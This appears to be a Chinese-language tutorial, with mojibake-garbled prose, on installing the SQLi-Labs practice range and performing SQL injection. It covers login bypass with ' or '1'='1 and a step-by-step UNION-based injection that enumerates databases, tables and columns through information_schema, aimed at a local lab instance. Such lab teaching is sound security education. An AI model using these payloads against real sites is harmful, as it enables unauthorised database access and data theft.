<h1 id="IIIã€SQLi-Labsé¶åœºå®‰è£…"><a href="#IIIã€SQLi-Labsé¶åœºå®‰è£…" class="headerlink" title="IIIã€SQLi-Labsé¶åœºå®‰è£…"></a>IIIã€SQLi-Labsé¶åœºå®‰è£…</h1><h2 id="ä¸€ã€æ‰‹åŠ¨å®‰è£…"><a href="#ä¸€ã€æ‰‹åŠ¨å®‰è£…" class="headerlink" title="ä¸€ã€æ‰‹åŠ¨å®‰è£…"></a>ä¸€ã€æ‰‹åŠ¨å®‰è£…</h2><h3 id="1ã€ä¸‹è½½æºç "><a href="#1ã€ä¸‹è½½æºç " class="headerlink" title="1ã€ä¸‹è½½æºç "></a>1ã€ä¸‹è½½æºç </h3><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">GitHub - Audi-1&#x2F;sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.</a></p>
<p><a target="_blank" rel="noopener" href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/056dfc8b-3b3a-41c3-b102-7b76c0c2ec9f/sqli-labs-master.zip">sqli-labs-master.zip</a></p>
<h3 id="2ã€æ­å»ºWAMPç¯å¢ƒ"><a href="#2ã€æ­å»ºWAMPç¯å¢ƒ" class="headerlink" title="2ã€æ­å»ºWAMPç¯å¢ƒ"></a>2ã€æ­å»ºWAMPç¯å¢ƒ</h3><p>ä½¿ç”¨PHPstudyåˆ›å»º<code>PHP 5.3.29</code>ç¯å¢ƒå’Œ<code>Mysql 5.7.26</code>ç¯å¢ƒ</p>
<p>å¯åœ¨â€ç½‘ç«™â†’ç®¡ç†â†’PHPç‰ˆæœ¬â†’php5.3.29ntsâ€é€‰æ‹©ä½¿ç”¨çš„PHPç‰ˆæœ¬</p>
<p><img src="https://secure2.wostatic.cn/static/cQVG828ZsSC2QH1RSPhqkd/image.png"></p>
<h3 id="3ã€å¤åˆ¶ç½‘ç«™æ–‡ä»¶"><a href="#3ã€å¤åˆ¶ç½‘ç«™æ–‡ä»¶" class="headerlink" title="3ã€å¤åˆ¶ç½‘ç«™æ–‡ä»¶"></a>3ã€å¤åˆ¶ç½‘ç«™æ–‡ä»¶</h3><p>å°†ä¸‹è½½çš„<code>sqli-labs-master.zip</code>ä¸­çš„<code>sqli-labs-master æ–‡ä»¶å¤¹</code> è§£å‹åˆ°<code>phpstudyå®‰è£…ç›®å½•</code>ä¸‹çš„<code>WWW</code>ç›®å½•ä¸­</p>
<h3 id="4ã€ä¿®æ”¹ç½‘ç«™é…ç½®æ–‡ä»¶"><a href="#4ã€ä¿®æ”¹ç½‘ç«™é…ç½®æ–‡ä»¶" class="headerlink" title="4ã€ä¿®æ”¹ç½‘ç«™é…ç½®æ–‡ä»¶"></a>4ã€ä¿®æ”¹ç½‘ç«™é…ç½®æ–‡ä»¶</h3><p>è¿›å…¥åˆšåˆšè§£å‹å‡ºçš„æ–‡ä»¶å¤¹å†…</p>
<p>åœ¨æ–‡ä»¶å¤¹<code>sql-connections</code>ä¸­é€‰æ‹©æ–‡ä»¶<code>db-creds.inc</code>å¹¶æ‰“å¼€</p>
<p>ä¿®æ”¹æ–‡ä»¶ä¸­çš„å¯†ç ä¸PHPstudyä¸­æ•°æ®åº“å¯†ç ç›¸åŒï¼Œå…¶ä»–éƒ¨åˆ†å¯ä¸åšä¿®æ”¹</p>
<h3 id="5ã€åˆå§‹åŒ–æ•°æ®åº“"><a href="#5ã€åˆå§‹åŒ–æ•°æ®åº“" class="headerlink" title="5ã€åˆå§‹åŒ–æ•°æ®åº“"></a>5ã€åˆå§‹åŒ–æ•°æ®åº“</h3><p>è¿›å…¥ä¸»é¡µï¼š<a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/">http://192.168.31.98/sqli-labs/</a></p>
<p>æ‰“å¼€é¶åœºéªŒè¯æ•°æ®åº“æ˜¯å¦å¯ç”¨</p>
<p><a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/sql-connections/setup-db.php">http://192.168.31.98/sqli-labs/sql-connections/setup-db.php</a></p>
<h2 id="äºŒã€Dockerå®‰è£…"><a href="#äºŒã€Dockerå®‰è£…" class="headerlink" title="äºŒã€Dockerå®‰è£…"></a>äºŒã€Dockerå®‰è£…</h2><p>ä½¿ç”¨Dockerè¿›è¡Œå®‰è£…éå¸¸çš„ç®€å•</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker search sqli-labs  <span class="comment"># æœç´¢sqli-labsé¶åœº</span></span><br><span class="line">docker pull acgpiano/sqli-labs  <span class="comment"># æ‹‰å–æŒ‡å®šçš„é¶åœº</span></span><br><span class="line">docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°†dockerå®¹å™¨å†…çš„<code>80</code>ç«¯å£æ˜ å°„åˆ°å¤–éƒ¨ç«¯å£<code>8888</code>ï¼Œæ˜ å°„ç«¯å£å¯è‡ªè¡Œä¿®æ”¹</p>
<h1 id="IVã€SQLæ³¨å…¥"><a href="#IVã€SQLæ³¨å…¥" class="headerlink" title="IVã€SQLæ³¨å…¥"></a>IVã€SQLæ³¨å…¥</h1><h2 id="ä¸€ã€æ¦‚å¿µï¼š"><a href="#ä¸€ã€æ¦‚å¿µï¼š" class="headerlink" title="ä¸€ã€æ¦‚å¿µï¼š"></a>ä¸€ã€æ¦‚å¿µï¼š</h2><p>æ‰€è°“çš„SQLæ³¨å…¥ï¼Œå°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°webè¡¨å•é€’äº¤åˆ°åå°æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤çš„å­—ç¬¦ä¸²ä¸­ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤</p>
<p>ç”¨æˆ·å¯æ§çš„è¾“å…¥æœªç»è¿‡æ»¤å°±è¢«å¸¦å…¥åˆ°SQLè¯­å¥ä¸­æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´SQLæ³¨å…¥æ”»å‡»çš„äº§ç”Ÿ</p>
<h2 id="äºŒã€ä¸‡èƒ½å¯†ç ç™»é™†"><a href="#äºŒã€ä¸‡èƒ½å¯†ç ç™»é™†" class="headerlink" title="äºŒã€ä¸‡èƒ½å¯†ç ç™»é™†"></a>äºŒã€ä¸‡èƒ½å¯†ç ç™»é™†</h2><p>ç™»é™†åŠŸèƒ½ï¼Œæ˜¯webç½‘ç«™ä¸­å¸¸è§çš„ä¸æ•°æ®åº“äº¤äº’çš„ä¸€ç§çš„åŠŸèƒ½</p>
<p>ä¸‡èƒ½å¯†ç ï¼Œå³æ˜¯é€šè¿‡ä¸€ä¸ªå¯†ç ï¼Œç»•è¿‡ç»•è¿‡ç™»é™†è®¤è¯ï¼ŒæˆåŠŸç™»é™†ä¸Šç³»ç»Ÿ</p>
<blockquote>
<p>â€˜orâ€™1â€™&#x3D;â€™1</p>
</blockquote>
<p>ä¸‡èƒ½å¯†ç çš„ä¸¤ç§æƒ…å†µï¼š<a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p>
<ul>
<li><code>username=admin</code>&amp;<code>password=&#39;or&#39;1&#39;=&#39;1</code></li>
</ul>
<p>æˆåŠŸç™»é™†<code>Dumb</code>ç”¨æˆ·</p>
<ul>
<li><code>username=admin&#39;or&#39;1&#39;=&#39;1</code>&amp;<code>password=1</code></li>
</ul>
<p>æˆåŠŸç™»é™†<code>admin</code>ç”¨æˆ·</p>
<p>ä»ä»£ç è§’åº¦æ¥åˆ†æåŸç†ï¼š</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1c483cc-7399-45cc-8531-8d445bb0b9a4/Untitled.png" alt="Untitled"></p>
<p>æƒ…å†µä¸€ï¼š<code>username=admin</code>&amp;<code>password=&#39;or&#39;1&#39;=&#39;1</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>æƒ…å†µäºŒï¼š<code>username=admin&#39;or&#39;1&#39;=&#39;1</code>&amp;<code>password=1</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<aside>

<p>ğŸ’¡ åœ¨Mysqlä¸­<code>and</code>çš„ä¼˜å…ˆçº§æ˜¯è¦é«˜äº<code>or</code>çš„ï¼Œåœ¨è¯­å¥ä¸­åŒæ—¶å­˜åœ¨ä¸¤ä¸ªå­—æ®µï¼Œå°†å…ˆæ‰§è¡Œ<code>and</code>ï¼Œå†æ‰§è¡Œ<code>or</code></p>
</aside>

<p>é€šè¿‡ä¼ å…¥ç‰¹æ®Šæ„é€ çš„è¯­å¥ï¼Œæ”¹å˜åŸåå°è¯­å¥çš„å«ä¹‰ï¼Œè€Œå¯¼è‡´ç™»é™†æˆåŠŸã€‚</p>
<h2 id="ä¸‰ã€SQLæ³¨å…¥çš„å±å®³"><a href="#ä¸‰ã€SQLæ³¨å…¥çš„å±å®³" class="headerlink" title="ä¸‰ã€SQLæ³¨å…¥çš„å±å®³"></a>ä¸‰ã€SQLæ³¨å…¥çš„å±å®³</h2><p>1ã€æ•°æ®ä¸ä¿¡æ¯æ³„æ¼</p>
<p>2ã€ç½‘é¡µè¢«ç¯¡æ”¹ã€ç½‘ç«™æŒ‚é©¬</p>
<p>3ã€æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶</p>
<p>4ã€å½±å“æœåŠ¡å¯ç”¨æ€§</p>
<p>5ã€ç”¨æˆ·å’Œä¼ä¸šè´¢äº§å®‰å…¨</p>
<h2 id="å››ã€SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#å››ã€SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="å››ã€SQLæ³¨å…¥çš„åˆ†ç±»"></a>å››ã€SQLæ³¨å…¥çš„åˆ†ç±»</h2><ul>
<li>è”åˆæŸ¥è¯¢æ³¨å…¥</li>
<li>æŠ¥é”™æ³¨å…¥</li>
<li>æ—¶é—´ç›²æ³¨</li>
<li>å¸ƒå°”ç›²æ³¨</li>
<li>å †å æ³¨å…¥</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–åˆ†ç±»çš„æ³¨å…¥</p>
<ul>
<li>äºŒæ¬¡æ³¨å…¥</li>
<li>HTTPå¤´æ³¨å…¥</li>
<li>å®½å­—èŠ‚æ³¨å…¥</li>
</ul>
<h2 id="äº”ã€é—­åˆæ–¹å¼"><a href="#äº”ã€é—­åˆæ–¹å¼" class="headerlink" title="äº”ã€é—­åˆæ–¹å¼"></a>äº”ã€é—­åˆæ–¹å¼</h2><p>1ã€é€šè¿‡æŠ¥é”™ä¿¡æ¯æ¥è¿›è¡Œåˆ¤æ–­</p>
<p>2ã€é€šè¿‡é¡µé¢å“åº”æ­£ç¡®ä¸å¦æ¥åˆ¤æ–­</p>
<h3 id="1ã€å•å¼•å·-39-39-ï¼šless-11"><a href="#1ã€å•å¼•å·-39-39-ï¼šless-11" class="headerlink" title="1ã€å•å¼•å·&#39;&#39; ï¼šless-11"></a>1ã€å•å¼•å·<code>&#39;&#39;</code> ï¼šless-11</h3><p>è¾“å…¥å•å¼•å·æŠ¥é”™ï¼Œè¾“å…¥å…¶ä»–ç¬¦å·é¡µé¢å“åº”æ­£å¸¸</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/05f1096e-ed81-46eb-add0-62e01870ce78/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æŠ¥é”™è¯­å¥</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>admin<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># åå°æŸ¥è¯¢è¯­å¥</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;</span>$uname<span class="string">&#x27; and password=&#x27;</span>$passwd<span class="string">&#x27; LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æŠ¥é”™ä¿¡æ¯çœ‹å‡ºå…¶ä¸­ä½¿ç”¨äº†<code>å•å¼•å·</code>è¿›è¡Œé—­åˆï¼ŒåŒæ—¶ä¹Ÿå¤šäº†ä¸€ä¸ªå•å¼•å·å¯¼è‡´æ— æ³•è¿›è¡Œé—­åˆ</p>
<h3 id="2ã€æ‹¬å·åŒå¼•å·-quot-quot-ï¼šless-13"><a href="#2ã€æ‹¬å·åŒå¼•å·-quot-quot-ï¼šless-13" class="headerlink" title="2ã€æ‹¬å·åŒå¼•å·(&quot;&quot;)ï¼šless-13"></a>2ã€æ‹¬å·åŒå¼•å·<code>(&quot;&quot;)</code>ï¼šless-13</h3><p>è¾“å…¥å•å¼•å·<code>&#39;</code>å’Œå•å¼•å·æ‹¬å·<code>&#39;)</code>æŠ¥é”™</p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf927659-929d-4ccd-8616-22d7d4ce51c7/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æŠ¥é”™è¯­å¥</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span>) <span class="keyword">and</span> password<span class="operator">=</span>(<span class="string">&#x27;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># åå°æŸ¥è¯¢è¯­å¥</span></span><br><span class="line"><span class="string">@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;</span>$uname<span class="string">&#x27;) and password=(&#x27;</span>$passwd<span class="string">&#x27;) LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="3ã€æ— é—­åˆï¼šless-2"><a href="#3ã€æ— é—­åˆï¼šless-2" class="headerlink" title="3ã€æ— é—­åˆï¼šless-2"></a>3ã€æ— é—­åˆï¼šless-2</h3><p>è¾“å…¥<code>?id=&#39;1</code></p>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8c282a03-1269-4c08-b4b5-573b0ccf44d0/Untitled.png" alt="Untitled"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># æŠ¥é”™è¯­å¥</span><br><span class="line"><span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">1</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># åå°æŸ¥è¯¢è¯­å¥</span></span><br><span class="line"><span class="string">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure>

<h3 id="4ã€å…¶ä»–ï¼š"><a href="#4ã€å…¶ä»–ï¼š" class="headerlink" title="4ã€å…¶ä»–ï¼š"></a>4ã€å…¶ä»–ï¼š</h3><p>é™¤ä»¥ä¸Šä»‹ç»çš„å‡ ç§ä¹‹å¤–ï¼Œé—­åˆæ–¹å¼è¿˜æœ‰å¾ˆå¤šç§ã€‚åœ¨åˆ¤æ–­é—­åˆæ–¹å¼çš„æ—¶å€™ï¼Œä¸»è¦æ ¹æ®æŠ¥é”™è¯­å¥åŠé¡µé¢çš„å“åº”æ¥åˆ¤æ–­</p>
<h2 id="å…­ã€è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#å…­ã€è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å…­ã€è”åˆæŸ¥è¯¢æ³¨å…¥"></a>å…­ã€è”åˆæŸ¥è¯¢æ³¨å…¥</h2><p><a target="_blank" rel="noopener" href="http://192.168.31.98/sqli-labs/Less-11/">http://192.168.31.98/sqli-labs/Less-11/</a></p>
<p>è”åˆæŸ¥è¯¢æ³¨å…¥æ˜¯ä¸€ç§æœ‰å›æ˜¾çš„æ³¨å…¥æ–¹æ³•ï¼Œåˆ©ç”¨union select æ¥æ„é€ payloadè¿›è¡ŒæŸ¥è¯¢ï¼Œä»è€Œå®ç°SQLæ³¨å…¥æ”»å‡»ã€‚</p>
<h3 id="1ã€åˆ¤æ–­é—­åˆ"><a href="#1ã€åˆ¤æ–­é—­åˆ" class="headerlink" title="1ã€åˆ¤æ–­é—­åˆ"></a>1ã€åˆ¤æ–­é—­åˆ</h3><p>ä¼ å…¥ä¸‹é¢å€¼æ¥è¿›è¡Œåˆ¤æ–­</p>
<blockquote>
<p>uname&#x3D;<code>adminâ€™</code>passwd&#x3D;<code>aaa</code></p>
</blockquote>
<p>æˆ–è€…</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>aaa&#39;</code></p>
</blockquote>
<p>è§‚å¯Ÿé¡µé¢çš„æŠ¥é”™ä¿¡æ¯ï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯å¯ä»¥åˆ¤æ–­å‡ºä½¿ç”¨çš„æ˜¯å•å¼•å·è¿›è¡Œé—­åˆ</p>
<h3 id="2ã€åˆ¤æ–­åˆ—æ•°"><a href="#2ã€åˆ¤æ–­åˆ—æ•°" class="headerlink" title="2ã€åˆ¤æ–­åˆ—æ•°"></a>2ã€åˆ¤æ–­åˆ—æ•°</h3><p>ä¼ å…¥</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 1--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 2--+ </code>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;order by 3--+</code></p>
</blockquote>
<p>å½“ä¼ å…¥å€¼ä¸º1å’Œ2æ—¶ï¼Œé¡µé¢å“åº”æ­£å¸¸ã€‚</p>
<p>å½“ä¼ å…¥å€¼ä¸º3æ—¶ï¼Œé¡µé¢æŠ¥é”™æç¤º<code>Unknown column &#39;3&#39; in &#39;order clauseâ€™</code></p>
<p>è¡¨ç¤ºåœ¨å½“å‰çš„æŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µ</p>
<h3 id="3ã€åˆ¤æ–­å›æ˜¾ä½ç½®"><a href="#3ã€åˆ¤æ–­å›æ˜¾ä½ç½®" class="headerlink" title="3ã€åˆ¤æ–­å›æ˜¾ä½ç½®"></a>3ã€åˆ¤æ–­å›æ˜¾ä½ç½®</h3><p>éƒ¨åˆ†ä»æ•°æ®åº“è·å–çš„æ•°æ®å¹¶ä¸ä¸€å®šå®Œæ•´çš„è¢«è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œå› æ­¤è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„è¾“å‡ºä½ç½®æ¥æ˜¾ç¤ºæ³¨å…¥ç»“æœ</p>
<p>ä½¿ç”¨union select è¿›è¡ŒæŸ¥è¯¢ï¼Œä»è€Œåˆ¤æ–­å›æ˜¾ä½ç½®</p>
<blockquote>
<p>username&#x3D;admin&amp;password&#x3D;â€™union select 1,2 â€“+</p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e2c9d2d3-9b11-421d-af6d-3b3089661326/Untitled.png" alt="Untitled"></p>
<p>ç”±ä¸Šå¯è§ï¼Œ1ï¼Œ2ä½ç½®éƒ½å¯ä»¥å›æ˜¾åˆ°é¡µé¢</p>
<h3 id="4ã€è·å–æ•°æ®åº“åŸºç¡€ä¿¡æ¯"><a href="#4ã€è·å–æ•°æ®åº“åŸºç¡€ä¿¡æ¯" class="headerlink" title="4ã€è·å–æ•°æ®åº“åŸºç¡€ä¿¡æ¯"></a>4ã€è·å–æ•°æ®åº“åŸºç¡€ä¿¡æ¯</h3><p>åˆ©ç”¨æ•°æ®åº“çš„å†…ç½®å‡½æ•°è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å½“å‰çš„æ•°æ®åº“</span><br><span class="line"><span class="keyword">SELECT</span> DATABASE()</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å½“å‰æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@VERSION</span> </span><br><span class="line"><span class="keyword">SELECT</span> VERSION()</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹ç”¨æˆ·</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()                        # ç”¨æˆ·å</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>()                # å½“å‰ç”¨æˆ·å</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">system_user</span>()                 # ç³»ç»Ÿç”¨æˆ·å</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>()                # é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å</span><br><span class="line"></span><br><span class="line"># å†…ç½®å‡½æ•°</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@datadir</span>                     # è¯»å–æ•°æ®åº“è·¯å¾„</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@basedir</span>                     # MySQLå®‰è£…è·¯å¾„</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>_compile_os           # æ“ä½œç³»ç»Ÿ</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@secure</span>_file_priv            # æŸ¥çœ‹æ•°æ®åº“secure_file_priv çš„å‚æ•°å€¼</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character</span>_sets_dir          # å­—ç¬¦é›†å®‰è£…ç›®å½•</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@character</span>_set_server        # å­—ç¬¦é›†ç¼–ç æ ¼å¼</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@hostname</span>;                   # æŸ¥çœ‹ä¸»æœºå</span><br></pre></td></tr></table></figure>

<h3 id="5ã€æŸ¥è¯¢æ•°æ®åº“"><a href="#5ã€æŸ¥è¯¢æ•°æ®åº“" class="headerlink" title="5ã€æŸ¥è¯¢æ•°æ®åº“"></a>5ã€æŸ¥è¯¢æ•°æ®åº“</h3><p>ä½¿ç”¨<code>select database()</code> å¯ä»¥æŸ¥è¯¢æ•°æ®åº“ï¼Œä½†æ˜¯ä»…èƒ½æŸ¥è¯¢å½“å‰æ‰€åœ¨çš„æ•°æ®åº“</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,database() --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/641bfdf8-54bd-438d-9b17-80491b6171c9/Untitled.png" alt="Untitled"></p>
<p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­å¥æŸ¥è¯¢å…¶ä»–æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>

<p>ç”±äºä»¥ä¸Šè¯­å¥æŸ¥è¯¢å‡ºçš„ç»“æœä¸ºå¤šåˆ—ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨<code>group_concat()</code>å°†ç»“æœè¿›è¡Œæ‹¼æ¥</p>
<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(schema_name) from information_schema.SCHEMATA --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23c40e2a-b6b2-4e21-8118-04e868026058/Untitled.png" alt="Untitled"></p>
<h3 id="6ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨"><a href="#6ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨" class="headerlink" title="6ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨"></a>6ã€æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“å†…çš„è¡¨</h3><p>è¿™é‡Œæ¥æŸ¥è¯¢<code>security</code>æ•°æ®åº“å†…çš„è¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7d0e922a-bdc5-42ed-a2c8-33c1c49db3ba/Untitled.png" alt="Untitled"></p>
<p>è‹¥æ˜¯è¦æŸ¥è¯¢å…¶ä»–æ•°æ®åº“å†…çš„è¡¨ï¼Œåˆ™æ›´æ¢table_schemaçš„å€¼å³å¯</p>
<h3 id="7ã€æŸ¥è¯¢è¡¨å†…çš„å­—æ®µ"><a href="#7ã€æŸ¥è¯¢è¡¨å†…çš„å­—æ®µ" class="headerlink" title="7ã€æŸ¥è¯¢è¡¨å†…çš„å­—æ®µ"></a>7ã€æŸ¥è¯¢è¡¨å†…çš„å­—æ®µ</h3><p>è¿™é‡Œæ¥æŸ¥è¯¢è¡¨<code>security.users</code> å†…çš„å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>uname&#x3D;<code>admin</code>&amp;passwd&#x3D;<code>&#39;union SELECT 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; --+</code></p>
</blockquote>
<blockquote>
</blockquote>
<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7fbc489b-c32b-42ad-ae35-3ca5ed0847ac/Untitled.png" alt="Untitled"></p>
<p>è¿™é‡Œéœ€è¦åŠ ä¸Š<code>table_schema</code>æ¥é™åˆ¶æ•°æ®åº“ï¼Œå¦åˆ™ä¼šå°†æ•°æ®åº“ä¸­æ‰€æœ‰çš„userè¡¨å†…å­—æ®µéƒ½æŸ¥è¯¢å‡ºæ¥</p>
<h3 id="8ã€æŸ¥è¯¢æ•°æ®"><a href="#8ã€æŸ¥è¯¢æ•°æ®" class="headerlink" title="8ã€æŸ¥è¯¢æ•°æ®"></a>8ã€æŸ¥è¯¢æ•°æ®</h3><p>æ­¤æ—¶å·²ç»è·å–åˆ°äº†security.usersè¡¨ç»“æ„</p>
